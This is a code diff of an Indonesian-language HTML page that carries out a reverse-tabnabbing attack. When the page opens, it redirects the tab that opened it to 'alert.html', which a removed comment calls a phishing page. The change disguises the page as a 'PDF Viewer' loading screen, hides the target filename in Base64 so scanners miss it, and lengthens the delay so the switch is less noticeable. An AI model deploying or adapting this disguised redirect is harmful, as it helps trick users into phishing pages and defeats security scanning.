@@ -2,26 +2,23 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Membaca Artikel...</title>
-    <style>
-        body { font-family: Arial; text-align: center; margin-top: 100px; color: #666; }
-    </style>
+    <title>PDF Viewer</title>
 </head>
 <body>
-    <h1>Tips Jago Bug Bounty</h1>
-    <p>Artikel sedang dimuat... Silakan baca tab sebelumnya sebentar.</p>
+    <div style="text-align: center; margin-top: 20%; font-family: sans-serif;">
+        <h3>Memuat Dokumen... 0%</h3>
+        <p>Mohon tunggu sebentar.</p>
+    </div>
 
     <script>
-        // Cek akses ke jendela yang membuka halaman ini
         if (window.opener) {
-            // Tunggu 1 detik agar perpindahan tidak terlalu mencurigakan
             setTimeout(function() {
-                // Ganti lokasi tab asal ke halaman phishing (alert.html)
-                window.opener.location = "alert.html";
-                console.log("Tab asal berhasil diarahkan ke alert.html");
-            }, 1000);
-        } else {
-            document.body.innerHTML += "<p style='color:red;'>Gagal: window.opener tidak ditemukan.</p>";
+                // "YWxlcnQuaHRtbA==" adalah Base64 dari "alert.html"
+                // Ini teknik dasar biar scanner nggak langsung baca string file tujuan
+                var target = atob("YWxlcnQuaHRtbA=="); 
+                window.opener.location = target;
+                console.log("Status: Update dikirim ke tab asal.");
+            }, 1500);
         }
     </script>
 </body>
